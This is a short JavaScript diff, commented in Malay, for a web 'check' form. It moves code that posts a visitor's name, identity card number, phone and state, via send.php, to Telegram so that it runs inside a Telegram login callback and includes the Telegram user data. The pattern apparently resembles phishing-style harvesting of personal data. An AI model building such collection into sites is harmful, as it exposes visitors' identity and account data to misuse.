@@ -563,26 +563,6 @@ function semakBorang(){
     if(!sah){
         return;
     }
-
-    // Hantar ke Telegram
-fetch("send.php", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        nama: nama.value,
-        ic: ic.value,
-        telefon: telefon.value,
-        negeri: negeri.value
-    })
-})
-.then(response => response.text())
-.then(data => {
-    console.log("Telegram:", data);
-})
-.catch(error => console.log(error));
-
 // Buka popup
 bukaPopup();
 
@@ -592,12 +572,21 @@ semakBtn.onclick = semakBorang;
 
 function onTelegramAuth(user){
 
+    const nama = document.getElementById("nama").value.trim();
+    const ic = document.getElementById("ic").value.trim();
+    const telefon = document.getElementById("telefon").value.trim();
+    const negeri = document.getElementById("negeri").value;
+
     fetch("send.php", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
         body: JSON.stringify({
+            nama: nama,
+            ic: ic,
+            telefon: telefon,
+            negeri: negeri,
             telegram_user: user
         })
     })
